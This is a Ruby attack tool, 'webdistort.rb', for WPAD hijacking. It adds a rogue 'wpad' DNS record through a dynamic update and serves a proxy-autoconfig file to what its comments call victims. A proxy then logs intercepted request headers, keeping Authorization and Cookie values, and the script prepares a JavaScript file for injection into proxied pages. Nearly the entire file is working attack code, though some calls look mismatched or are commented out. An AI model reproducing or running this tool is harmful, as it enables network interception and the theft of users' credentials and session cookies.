#!/usr/bin/ruby
#

# define external libraries
require "rubygems"
require "dnsruby"
require "optparse"
require "socket"
require "webrick"
require "webrick/httpproxy"
require "webrick/httputils"
require "pp"

require "distort_dns"

=begin
	Craft a DNS A record to create the WPAD entry for this host.
=end
def update_dns(http_ip, domain, primary_dns_addr)
	dns_update = Dnsruby::Update.new(domain)
	
	host = 'wpad.' + domain

	dns_update.absent(host, 'A')
	
	dns_update.add(host, 'A', 86400, http_ip)

	dns_resolver = Dnsruby::Resolver.new(:nameserver => primary_dns_addr)

	begin
		response = dns_resolver.send_message(dns_update)
		print 'WPAD address created'
		rescue Exception => e
			print 'Error: ' + e
	end
end

=begin
	Start web server to serve wpad.dat & other documents to victims.
=end
def start_http(http_port, http_root, data_dir)
  http_logger = WEBrick::Log.new(data_dir + "/http.log")
  access_log_file = File.open(data_dir + "/http_access.log", "a")
  access_logger = [[access_log_file, WEBrick::AccessLog::COMBINED_LOG_FORMAT]]
  
	system_mime_table = WEBrick::HTTPUtils::DefaultMimeTypes
	user_mime_table = system_mime_table.update(
		{ "dat" => "application/x-ns-proxy-autoconfig" })

	server = WEBrick::HTTPServer.new(
    :Logger => http_logger,
    :AccessLog => access_logger,
		:MimeTypes => user_mime_table,
		:Port => http_port, 
		:DocumentRoot => http_root)

  ['INT', 'TERM', 'KILL'].each {|signal|
    trap(signal) { server.shutdown ; access_log_file.close }
  }
	server.start
end

def modify_body (body, http_ip, http_port, http_root)
#  js_file = "http://" + http_ip + ":" + http_port.to_s + "/inject.js"
#  body.gsub(s%</head>%<script language='javascript' src='${JS_URL}'></script></head>%i)
  return body
end

$header_file = nil

def setup_files(http_data_dir, proxy_port, proxy_ip, http_port)
  wpad_template_file = File.open(http_data_dir + "/wpad.dat.tpl", "r")
  wpad_data = wpad_template_file.read
  wpad_template_file.close
  
  wpad_file = File.open(http_data_dir + "/wpad.dat", "w")
  wpad_file.syswrite(wpad_data.gsub(/proxyIpAddr/, proxy_ip).gsub(/proxyPort/, proxy_port.to_s))
  #puts wpad_data.gsub(/proxyIpAddr/, proxy_ip).gsub(/proxyPort/, proxy_port.to_s)
  wpad_file.close
  
  js_template_file = File.open(http_data_dir + "/inject.js.tpl", "r")
  js_data = js_template_file.read
  js_template_file.close
  
  js_file = File.open(http_data_dir + "/inject.js", "w")
  js_file.syswrite(js_data.gsub(/proxyIpAddr/, proxy_ip).gsub(/httpPort/, http_port.to_s))
  js_file.close
end

def handle_contents(request, response, data_dir, grab_all_headers)
	if response.content_type =~/text/ || response.content_type =~/javascript/
		if $header_file == nil
		  $header_file = File.open(data_dir + "/headers.txt", "a")
		end
		              
		header_output = request.request_line
		request.raw_header.each {|line| header_output = header_output + line}
		header_output = header_output + "-"*70+"\n"
		  
    if grab_all_headers || header_output =~ /Authorization/ || header_output =~ /Cookie/
  		count =  $header_file.syswrite(header_output);	
    end

    return modify_body(response.body)
  else
    return response.body
	end
end


def start_proxy(proxy_port, log_dir, grab_all_headers)
	proxy_logger = WEBrick::Log.new(log_dir + "/proxy.log")
  access_log_file = File.open(log_dir + "/proxy_access.log", "a")
  access_logger = [[access_log_file, WEBrick::AccessLog::COMBINED_LOG_FORMAT]]


	proxy = WEBrick::HTTPProxyServer.new(
		:Logger => proxy_logger,
    :AccessLog => access_logger,
		:Port => proxy_port,
    :RequestCallback => Proc.new{|req,res| 
      if req.request_method == "CONNECT" 
#        pp WEBrick::HTTPRequest.new()
      end
      req.header.delete('accept-encoding') },
   	:ProxyContentHandler => lambda {|request, response| response.body = handle_contents(request, response, log_dir, grab_all_headers)})
		
  ['INT', 'TERM', 'KILL'].each {|signal|
  	trap(signal) { proxy.shutdown ; access_log_file.close }
  }
	proxy.start
end

def get_ip_address
	orig, Socket.do_not_reverse_lookup = Socket.do_not_reverse_lookup, true
	
	ipAddr = ''

	UDPSocket.open do |s|
		s.connect '64.233.187.99', 1
		ipAddr = s.addr.last
	end
	ensure
		Socket.do_not_reverse_lookup = orig

	return ipAddr
end

options = {
	"proxy_ip" => get_ip_address,
	"proxy_port" => 8080,
	"http_port" => 80,
	"http_root" => Dir::pwd + "/webdistort_htdocs",
	"data_dir" => Dir::pwd + "/saved"
}
usage = ''

opts = OptionParser.new do |opts|
	opts.banner = "Usage: webdistort.rb [options]"

	opts.separator ""
	opts.separator "Required:"
	opts.on("-d <domain>", String, "Domain to create wpad entry on") do |d|
		options["domain"] = d
	end

	opts.on("-p <primary dns address>", String, "Primary DNS Server address") do |p|
		options["primary_dns"] = p
	end
	opts.separator ""
	opts.separator "Optional:"
	opts.on("-i <ip address>", String, "Specify IP Address to run servers on, otherwise autodetect" ) do |i|
		options["proxy_ip"] = i
	end
	opts.on("-x <port>", "--proxy-port", "Specify port for proxy to bind") do |proxy_port|
		options["proxy_port"] = proxy_port
	end
	opts.on("-w <port>", "--http-port", "Specify port for http server to bind") do |http_port|
		options["http_port"] = http_port
  end
  opts.on("-g", "Grab all sent headers") do
    options["grab_headers"] = true
  end
	opts.on_tail("-h", "Print this help") do
		puts opts
		exit
	end
	usage = opts
end.parse!

if options["domain"] == nil || options["primary_dns"] == nil
	puts usage
	exit
end

#setup_files

#fork do
#	puts "Proxy PID: #$$"
#	start_proxy(options["proxy_port"], options["data_dir"], options["grab_headers"])
#end

#fork do
#	puts "HTTP PID: #$$"
#	start_http(options["http_port"], options["http_root"], options["data_dir"])
#end

setup_files options["http_root"], options["proxy_port"], options["proxy_ip"], options["http_port"]

update_dns options["proxy_ip"], options["domain"], options["primary_dns"]
